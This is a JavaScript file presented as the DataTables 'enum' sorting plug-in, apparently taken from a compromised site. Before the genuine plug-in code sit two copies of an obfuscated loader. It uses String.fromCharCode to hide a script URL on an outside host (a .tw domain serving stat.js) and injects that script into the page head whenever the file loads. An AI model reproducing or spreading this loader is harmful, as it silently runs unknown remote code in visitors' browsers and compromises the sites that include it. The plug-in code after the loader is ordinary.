Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * Sort data by a defined enumerated (enum) list. The options for the values in
 * the enum are defined by passing the values in an array to the method
 * `$.fn.dataTable.enum`. Type detection and sorting plug-ins for DataTables will
 * automatically be generated and added to the table.
 *
 * For full details and instructions please see [this DataTables blog
 * post](//datatables.net/blog/2016-06-16).
 *
 * @name enum
 * @summary Dynamically create enum sorting options for a DataTable
 * @author [SpryMedia Ltd](http://datatables.net)
 *
 *  @example
 *    $.fn.dataTable.enum( [ 'High', 'Medium', 'Low' ] );
 *
 *    $('#example').DataTable();
 */


(function ($) {


var unique = 0;
var types = $.fn.dataTable.ext.type;

// Using form $.fn.dataTable.enum breaks at least YuiCompressor since enum is
// a reserved word in JavaScript
$.fn.dataTable['enum'] = function ( arr ) {
	var name = 'enum-'+(unique++);
	var lookup = window.Map ? new Map() : {};

	for ( var i=0, ien=arr.length ; i<ien ; i++ ) {
		lookup[ arr[i] ] = i;
	}

	// Add type detection
	types.detect.unshift( function ( d ) {
		return lookup[ d ] !== undefined ?
			name :
			null;
	} );

	// Add sorting method
	types.order[ name+'-pre' ] = function ( d ) {
		return lookup[ d ];
	};
};


})(jQuery);
